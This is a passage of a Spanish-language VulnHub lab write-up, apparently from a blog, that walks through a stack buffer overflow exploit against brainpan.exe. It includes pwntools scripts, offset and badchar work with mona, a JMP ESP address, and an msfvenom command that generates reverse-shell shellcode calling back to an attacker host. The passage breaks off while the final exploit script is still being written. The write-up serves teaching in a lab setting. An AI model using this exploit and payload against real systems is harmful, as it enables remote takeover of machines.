</span></span></code></pre></div><p>Lo que vamos a hacer con esto es mandarle 1000 &ldquo;A&rdquo; al programa que corre por el puerto 9999 de la máquina windows.</p><p>Una vez ejecutado el script. Desde inmunity debugger se puede ver como ahora el EIP vale <strong>41414141</strong> lo que equivale a <strong>AAAA</strong> Esto significa que si ponemos un input muy largo podemos llegar a sobreescribir el EIP</p><blockquote><p><strong>EIP</strong>: (Punto de Instrucción de Entrada) es un <strong>registro</strong> que <strong>almacena</strong> la <strong>dirección</strong> de la <strong>próxima instrucción</strong> a ejecutar en un programa.</p></blockquote><h3 id=calcular-offset>Calcular Offset<a href=#calcular-offset class=anchor aria-hidden=true>#</a></h3><p>Ahora buscaremos cuantas &ldquo;A&rdquo; hay que poner para llegar al EIP. Para encontrar este número llamado <strong>offset</strong>, usaremos una cadena de caracteres diseñada para esto.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span class=m>1800</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5...
</span></span></code></pre></div><p>Este comando nos ha generado una cadena de <strong>1800 caracteres</strong>. La cual vamos a añadir en el script.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>junk</span> <span class=o>=</span> <span class=s2>&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8&gt;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>junk</span>
</span></span><span class=line><span class=cl><span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=s2>&#34;192.168.1.141&#34;</span><span class=p>,</span> <span class=mi>9999</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>Ejecutamos el script, y en el Imunnity Debugger aparece que el EIP vale: 35724134.</p><p>Con el siguiente comando calculamos automáticamente el offset</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <span class=m>1800</span> -q <span class=m>35724134</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Exact match at offset <span class=m>524</span>
</span></span></code></pre></div><h3 id=buscar-badchars>Buscar badchars<a href=#buscar-badchars class=anchor aria-hidden=true>#</a></h3><p>Una vez tenemos el control del EIP vamos a comprobar si hay <strong>badchars</strong>.</p><blockquote><p>Los <strong>badchars</strong> básicamente son caracteres que pueden dar problemas a la hora de ejecutar un shellcode, un badchar típico es el <strong>\x00 (Null byte)</strong> el cual ya se suele excluir directamente porque da muchos problemas.</p></blockquote><p>Para comprobar los badchars podríamos hacerlo de forma manual, pero vamos a usar mona para automatizarlo. Primero hay que definir el directorio de trabajo, en mi caso va a ser <code>C:\Users\arnau\Desktop\bof</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona config -set workingfolder C:<span class=se>\U</span>sers<span class=se>\a</span>rnau<span class=se>\D</span>esktop<span class=se>\b</span>of
</span></span></code></pre></div><p>Después vamos a crear un archivo con todos los bytes excluyendo el <strong>null byte (\x00)</strong>, y lo vamos a guardar en el directorio de trabajo.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona bytearray -b <span class=s2>&#34;\x00&#34;</span>
</span></span></code></pre></div><p>Ahora dentro del archivo <code>C:\Users\arnau\Desktop\bof\bytearray.txt</code> están todos los bytes.</p><pre tabindex=0><code>================================================================================
  Output generated by mona.py v2.0, rev 635 - Immunity Debugger
  Corelan Consulting bv - https://www.corelan.be
================================================================================
  OS : 7, release 6.1.7601
  Process being debugged : brainpan (pid 2272)
  Current mona arguments: bytearray -b &#34;\x00&#34;
================================================================================
  2024-02-05 19:12:33
================================================================================
&#34;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&#34;
&#34;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&#34;
&#34;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&#34;
&#34;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&#34;
&#34;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&#34;
&#34;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&#34;
&#34;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&#34;
&#34;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#34;
</code></pre><p>Todos estos bytes vamos a ponerlos en el script de python para que se incorporen después del EIP, de momento el EIP le vamos a dar de valor &ldquo;42424242&rdquo; (BBBB). Esto queda tal que asi:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>524</span>
</span></span><span class=line><span class=cl><span class=n>junk</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl><span class=n>eip</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;B&#34;</span> <span class=o>*</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>after_eip</span> <span class=o>=</span> <span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>junk</span> <span class=o>+</span> <span class=n>eip</span> <span class=o>+</span> <span class=n>after_eip</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=s2>&#34;192.168.88.12&#34;</span><span class=p>,</span> <span class=mi>9999</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>Ahora al hacer Click derecho en el ESP arriba a la derecha > Follow in Dump, vemos donde empiezan los bytes que hemos puesto después del EIP, y a la izquierda podemos ver la dirección de memoria donde empiezan los bytes de la comprobación de los badchars</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/vulnhub/brainpan-1/images/bof4_hu3e75403602574cae0d3097978146f395_44030_8238fb0087d6b0e97aa8b1e7fc07b97a.webp 480w, /writeups/vulnhub/brainpan-1/images/bof4_hu3e75403602574cae0d3097978146f395_44030_2da269224f157c2326e6bd68982830dd.webp 640w, /writeups/vulnhub/brainpan-1/images/bof4_hu3e75403602574cae0d3097978146f395_44030_38579e966b3246430127ef6427cd1d89.webp 800w, /writeups/vulnhub/brainpan-1/images/bof4_hu3e75403602574cae0d3097978146f395_44030_5dd660175fd9d887cf3b86480d47f5d0.webp 1024w" fetchpriority=low height=900 id=h-rh-i-0 src=/writeups/vulnhub/brainpan-1/images/bof4_hu3e75403602574cae0d3097978146f395_44030_c63d9c09967159efff67c13d54d7c588.webp width=1600></p><pre tabindex=0><code>0022F918   41414141  AAAA
0022F91C   41414141  AAAA
0022F920   41414141  AAAA
0022F924   41414141  AAAA
0022F928   41414141  AAAA
0022F92C   42424242  BBBB
0022F930   04030201  
0022F934   08070605  
0022F938   0C0B0A09  ...
0022F93C   100F0E0D  .
0022F940   14131211  
0022F944   18171615  
0022F948   1C1B1A19  
0022F94C   201F1E1D  
0022F950   24232221  !&#34;#$
0022F954   28272625  %&amp;&#39;(
0022F958   2C2B2A29  )*+,
0022F95C   302F2E2D  -./0
0022F960   34333231  1234
</code></pre><p>Nos podemos fijar en que byte no sale representado de forma correcta o usar el siguiente comando de mona</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona compare -f C:<span class=se>\U</span>sers<span class=se>\a</span>rnau<span class=se>\D</span>esktop<span class=se>\b</span>of<span class=se>\b</span>ytearray.bin -a 0022F930
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>0BADF00D  <span class=o>[</span>+<span class=o>]</span> Fetched <span class=m>255</span> bytes successfully from C:<span class=se>\U</span>sers<span class=se>\a</span>rnau<span class=se>\D</span>esktop<span class=se>\b</span>of<span class=se>\b</span>ytearray.bin
</span></span><span class=line><span class=cl>0BADF00D      - Comparing <span class=m>1</span> location<span class=o>(</span>s<span class=o>)</span>
</span></span><span class=line><span class=cl>0BADF00D  Comparing bytes from file with memory :
</span></span><span class=line><span class=cl>0022F930  <span class=o>[</span>+<span class=o>]</span> Comparing with memory at location : 0x0022f930 <span class=o>(</span>Stack<span class=o>)</span>
</span></span><span class=line><span class=cl>0022F930  !!! Hooray, normal shellcode unmodified !!!
</span></span><span class=line><span class=cl>0022F930  Bytes omitted from input: <span class=m>00</span>
</span></span></code></pre></div><p>Después de ejecutar el comando se abre una ventanita la cual muestra los badchars encontrados, en este caso no ha encontrado ninguno. Así que a la hora de crear el shellcode simplemente excluiremos los <code>\x00</code></p><h3 id=protecciones>Protecciones<a href=#protecciones class=anchor aria-hidden=true>#</a></h3><p>Con el siguiente comando podemos ver los las protecciones del binario</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona modules
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>0BADF00D  ----------------------------------------------------------------------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>0BADF00D   Module info :
</span></span><span class=line><span class=cl>0BADF00D  ----------------------------------------------------------------------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>0BADF00D   Base       <span class=p>|</span> Top        <span class=p>|</span> Size       <span class=p>|</span> Rebase <span class=p>|</span> SafeSEH <span class=p>|</span> ASLR  <span class=p>|</span> CFG   <span class=p>|</span> NXCompat <span class=p>|</span> OS Dll <span class=p>|</span> Version, Modulename <span class=p>&amp;</span> Path, DLLCharacteristics
</span></span><span class=line><span class=cl>0BADF00D  ----------------------------------------------------------------------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>....
</span></span><span class=line><span class=cl>0BADF00D   0x76df0000 <span class=p>|</span> 0x76ec4000 <span class=p>|</span> 0x000d4000 <span class=p>|</span> True   <span class=p>|</span> True    <span class=p>|</span> True  <span class=p>|</span> False <span class=p>|</span>  True    <span class=p>|</span> True   <span class=p>|</span> 6.1.7600.16385 <span class=o>[</span>kernel32.dll<span class=o>]</span> <span class=o>(</span>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\k</span>ernel32.dll<span class=o>)</span> 0x140
</span></span><span class=line><span class=cl>0BADF00D   0x31170000 <span class=p>|</span> 0x31176000 <span class=p>|</span> 0x00006000 <span class=p>|</span> False  <span class=p>|</span> False   <span class=p>|</span> False <span class=p>|</span> False <span class=p>|</span>  False   <span class=p>|</span> False  <span class=p>|</span> -1.0- <span class=o>[</span>brainpan.exe<span class=o>]</span> <span class=o>(</span>C:<span class=se>\U</span>sers<span class=se>\a</span>rnau<span class=se>\D</span>ownloads<span class=se>\b</span>rainpan.exe<span class=o>)</span> 0x0
</span></span><span class=line><span class=cl>0BADF00D   0x76960000 <span class=p>|</span> 0x76a0c000 <span class=p>|</span> 0x000ac000 <span class=p>|</span> True   <span class=p>|</span> True    <span class=p>|</span> True  <span class=p>|</span> False <span class=p>|</span>  True    <span class=p>|</span> True   <span class=p>|</span> 7.0.7600.16385 <span class=o>[</span>msvcrt.dll<span class=o>]</span> <span class=o>(</span>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32<span class=se>\m</span>svcrt.dll<span class=o>)</span> 0x140
</span></span><span class=line><span class=cl>....
</span></span><span class=line><span class=cl>0BADF00D  -----------------------------------------------------------------------------------------------------------------------------------------  
</span></span></code></pre></div><p>En la fila del brainpan.exe sale todo en false.</p><h3 id=jmp-esp>JMP ESP<a href=#jmp-esp class=anchor aria-hidden=true>#</a></h3><p>Ahora toca encontrar la dirección del JMP ESP. Para encontrarlo necesitamos saber el opcode de JMP ESP</p><pre tabindex=0><code>&gt; /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm &gt; jmp ESP
00000000  FFE4              jmp esp
nasm &gt; 
</code></pre><p>El opcode de JMP ESP es FFE4, sabiendo esto, podemos buscar con mona la dirección del JMP ESP</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona find -s <span class=s2>&#34;\xFF\xE4&#34;</span> -m brainpan.exe
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>712F3    0x311712f3 : <span class=s2>&#34;\xFF\xE4&#34;</span> <span class=p>|</span>  <span class=o>{</span>PAGE_EXECUTE_READ<span class=o>}</span> <span class=o>[</span>brainpan.exe<span class=o>]</span> ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- <span class=o>(</span>C:<span class=se>\U</span>sers<span class=se>\a</span>rnau<span class=se>\D</span>ownloads<span class=se>\b</span>rainpan.exe<span class=o>)</span>, 0x0
</span></span></code></pre></div><p>La dirección del JMP ESP es: 0x311712f3</p><h3 id=shellcode>Shellcode<a href=#shellcode class=anchor aria-hidden=true>#</a></h3><p>Por último vamos a desarrollar el shellcode el cual nos enviara una reverse shell a nuestra máquina de atacante.
Para crear el shellcode usaremos msfvenom de la siguiente forma:</p><pre tabindex=0><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.88.5 LPORT=443 --platform windows -a x86 -e x86/shikata_ga_nai -f py -b &#34;\x00&#34; EXITFUNC=thread

buf =  b&#34;&#34;
buf += b&#34;\xba\x0c\xa9\x71\x87\xdb\xde\xd9\x74\x24\xf4\x5d&#34;
buf += b&#34;\x33\xc9\xb1\x52\x31\x55\x12\x83\xc5\x04\x03\x59&#34;
buf += b&#34;\xa7\x93\x72\x9d\x5f\xd1\x7d\x5d\xa0\xb6\xf4\xb8&#34;
buf += b&#34;\x91\xf6\x63\xc9\x82\xc6\xe0\x9f\x2e\xac\xa5\x0b&#34;
buf += b&#34;\xa4\xc0\x61\x3c\x0d\x6e\x54\x73\x8e\xc3\xa4\x12&#34;
buf += b&#34;\x0c\x1e\xf9\xf4\x2d\xd1\x0c\xf5\x6a\x0c\xfc\xa7&#34;
buf += b&#34;\x23\x5a\x53\x57\x47\x16\x68\xdc\x1b\xb6\xe8\x01&#34;
buf += b&#34;\xeb\xb9\xd9\x94\x67\xe0\xf9\x17\xab\x98\xb3\x0f&#34;
buf += b&#34;\xa8\xa5\x0a\xa4\x1a\x51\x8d\x6c\x53\x9a\x22\x51&#34;
buf += b&#34;\x5b\x69\x3a\x96\x5c\x92\x49\xee\x9e\x2f\x4a\x35&#34;
buf += b&#34;\xdc\xeb\xdf\xad\x46\x7f\x47\x09\x76\xac\x1e\xda&#34;
buf += b&#34;\x74\x19\x54\x84\x98\x9c\xb9\xbf\xa5\x15\x3c\x6f&#34;
buf += b&#34;\x2c\x6d\x1b\xab\x74\x35\x02\xea\xd0\x98\x3b\xec&#34;
buf += b&#34;\xba\x45\x9e\x67\x56\x91\x93\x2a\x3f\x56\x9e\xd4&#34;
buf += b&#34;\xbf\xf0\xa9\xa7\x8d\x5f\x02\x2f\xbe\x28\x8c\xa8&#34;
buf += b&#34;\xc1\x02\x68\x26\x3c\xad\x89\x6f\xfb\xf9\xd9\x07&#34;
buf += b&#34;\x2a\x82\xb1\xd7\xd3\x57\x15\x87\x7b\x08\xd6\x77&#34;
buf += b&#34;\x3c\xf8\xbe\x9d\xb3\x27\xde\x9e\x19\x40\x75\x65&#34;
buf += b&#34;\xca\xaf\x22\x3d\x0f\x58\x31\xbd\x0e\x23\xbc\x5b&#34;
buf += b&#34;\x7a\x43\xe9\xf4\x13\xfa\xb0\x8e\x82\x03\x6f\xeb&#34;
buf += b&#34;\x85\x88\x9c\x0c\x4b\x79\xe8\x1e\x3c\x89\xa7\x7c&#34;
buf += b&#34;\xeb\x96\x1d\xe8\x77\x04\xfa\xe8\xfe\x35\x55\xbf&#34;
buf += b&#34;\x57\x8b\xac\x55\x4a\xb2\x06\x4b\x97\x22\x60\xcf&#34;
buf += b&#34;\x4c\x97\x6f\xce\x01\xa3\x4b\xc0\xdf\x2c\xd0\xb4&#34;
buf += b&#34;\x8f\x7a\x8e\x62\x76\xd5\x60\xdc\x20\x8a\x2a\x88&#34;
buf += b&#34;\xb5\xe0\xec\xce\xb9\x2c\x9b\x2e\x0b\x99\xda\x51&#34;
buf += b&#34;\xa4\x4d\xeb\x2a\xd8\xed\x14\xe1\x58\x0d\xf7\x23&#34;
buf += b&#34;\x95\xa6\xae\xa6\x14\xab\x50\x1d\x5a\xd2\xd2\x97&#34;
buf += b&#34;\x23\x21\xca\xd2\x26\x6d\x4c\x0f\x5b\xfe\x39\x2f&#34;
buf += b&#34;\xc8\xff\x6b&#34;
</code></pre><p>Falta juntarlo todo en el script</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>struct</span> <span class=kn>import</span> <span class=n>pack</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>524</span>
</span></span><span class=line><span class=cl><span class=n>junk</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl><span class=n>eip</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=mh>0x311712f3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span>  <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xba\x0c\xa9\x71\x87\xdb\xde\xd9\x74\x24\xf4\x5d</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x33\xc9\xb1\x52\x31\x55\x12\x83\xc5\x04\x03\x59</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xa7\x93\x72\x9d\x5f\xd1\x7d\x5d\xa0\xb6\xf4\xb8</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x91\xf6\x63\xc9\x82\xc6\xe0\x9f\x2e\xac\xa5\x0b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xa4\xc0\x61\x3c\x0d\x6e\x54\x73\x8e\xc3\xa4\x12</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x0c\x1e\xf9\xf4\x2d\xd1\x0c\xf5\x6a\x0c\xfc\xa7</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x23\x5a\x53\x57\x47\x16\x68\xdc\x1b\xb6\xe8\x01</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xeb\xb9\xd9\x94\x67\xe0\xf9\x17\xab\x98\xb3\x0f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xa8\xa5\x0a\xa4\x1a\x51\x8d\x6c\x53\x9a\x22\x51</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x5b\x69\x3a\x96\x5c\x92\x49\xee\x9e\x2f\x4a\x35</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xdc\xeb\xdf\xad\x46\x7f\x47\x09\x76\xac\x1e\xda</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x74\x19\x54\x84\x98\x9c\xb9\xbf\xa5\x15\x3c\x6f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x2c\x6d\x1b\xab\x74\x35\x02\xea\xd0\x98\x3b\xec</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xba\x45\x9e\x67\x56\x91\x93\x2a\x3f\x56\x9e\xd4</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xbf\xf0\xa9\xa7\x8d\x5f\x02\x2f\xbe\x28\x8c\xa8</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xc1\x02\x68\x26\x3c\xad\x89\x6f\xfb\xf9\xd9\x07</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x2a\x82\xb1\xd7\xd3\x57\x15\x87\x7b\x08\xd6\x77</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x3c\xf8\xbe\x9d\xb3\x27\xde\x9e\x19\x40\x75\x65</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xca\xaf\x22\x3d\x0f\x58\x31\xbd\x0e\x23\xbc\x5b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x7a\x43\xe9\xf4\x13\xfa\xb0\x8e\x82\x03\x6f\xeb</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x85\x88\x9c\x0c\x4b\x79\xe8\x1e\x3c\x89\xa7\x7c</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xeb\x96\x1d\xe8\x77\x04\xfa\xe8\xfe\x35\x55\xbf</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x57\x8b\xac\x55\x4a\xb2\x06\x4b\x97\x22\x60\xcf</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x4c\x97\x6f\xce\x01\xa3\x4b\xc0\xdf\x2c\xd0\xb4</span><span class=s2>&#34;</span>
